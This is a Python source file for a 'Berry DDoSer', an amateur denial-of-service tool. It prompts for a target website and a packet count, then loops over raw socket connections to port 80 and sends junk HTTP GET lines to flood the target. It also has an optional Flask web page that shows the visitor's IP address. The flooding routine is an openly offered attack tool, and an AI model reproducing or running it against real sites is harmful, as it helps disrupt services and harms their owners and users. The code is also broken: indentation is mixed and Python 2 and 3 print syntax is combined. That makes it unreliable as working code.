#usr/bin/python
"""
"""
import time, socket, os, sys, string, random, subprocess
import httplib
from flask import Flask
from colorama import *
init()

# generates a user agent array
def user_agent():
	global uagent
	uagent=[]
	uagent.append("uagent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("uagent=[]Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)

#Extra Shizzzz / Not really important :/
version = "0.0.1]"
subprocess.call('clear', shell=True)

def main():
	#Main Banner
	print(Fore.RED + "\t  ,/         \.  ")
	print("\t ((           )) ")
	print("\t  \`.       ,'   ")
	print("\t   )')     (`(	  ")
	print("\t ,'`/       \,`. ")
	print("\t(`-(         )-')")
	print("\t  \-')     (`-/  ")
	print("\t  /`'       `'\  ")
	print("\t (  _       _  ) ")
	print("\t | ( \     / ) | ")
	print("\t |  `.\   /,'  | ")
	print("\t |    `\ /'    | ")
	print("\t (             ) ")
	print("\t  \           /  ")
	print("\t   \         /   ")
	print("\t    `.     ,'    ")
	print("\t      `-.-'      ")
	print("\t             [v" + version)
		#Menu when loaded
        print "\nSelect option:"
        print
        print "\t [1] Berry DDoSer"
        print "\t [2] Start Webgui (Currently Still in Beta)"
	print "\n0) To Exit"
        print
        print

        choice = raw_input(Fore.BLUE + 'berry > ')
        print

        if choice == '1':
        	print ("[!] DDoS Mode Loaded")
        	#params for dos
        	host = raw_input('Website to DDoS: ')
        	port = 80
        	conn = raw_input("Number of Packets: ")
        	message = "#strrrry is an eGod"
        	ip = socket.gethostbyname( host )

        	def dos_it():
        		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        		try:
        			#start ddos attack
        			ddos.connect((host, 80))
        			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
        			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
        		except socket.error, msg:
        			print("[!] [Connection Failed]")
        		print("[DDoS Attack Serving on port: %s..]" % port)
        		ddos.close()
        	
        	for i in xrange(int(conn)):
        		dos_it()

        if choice == '2':
        	#Run webgui
			app = Flask(__name__)

			@app.route("/")
			def web_start():
			    return '''
			   <html>
				<head>
					<style>
					 body{
					 	background-color: black;
					}
				</style>
				</head>
				<body>
				<center>
					<h1 style="color: red;">Berry DDoSer</h1>
				    <h2 style="color: white;" id="ipaddress"></h2>
				</center>
				</body>
				<script>
					window.onload = function () {
			        var script = document.createElement("script");
			        script.type = "text/javascript";
			        script.src = "http://www.telize.com/jsonip?callback=DisplayIP";
			        document.getElementsByTagName("head")[0].appendChild(script);
			    };
			    function DisplayIP(response) {
			        document.getElementById("ipaddress").innerHTML = "Your IP Address is " + response.ip;
			    }
				</script>
				</html>
			    '''

			if __name__ == "__main__":
				app.run()

        if choice == "exit" or choice == '0' or choice == '':
        	#exit in any case
            raw_input("\t[!] Quiting Session...")
            print("\n[!] Session Closed.")
            exit()


if __name__ == '__main__':
		main()
		
	                                             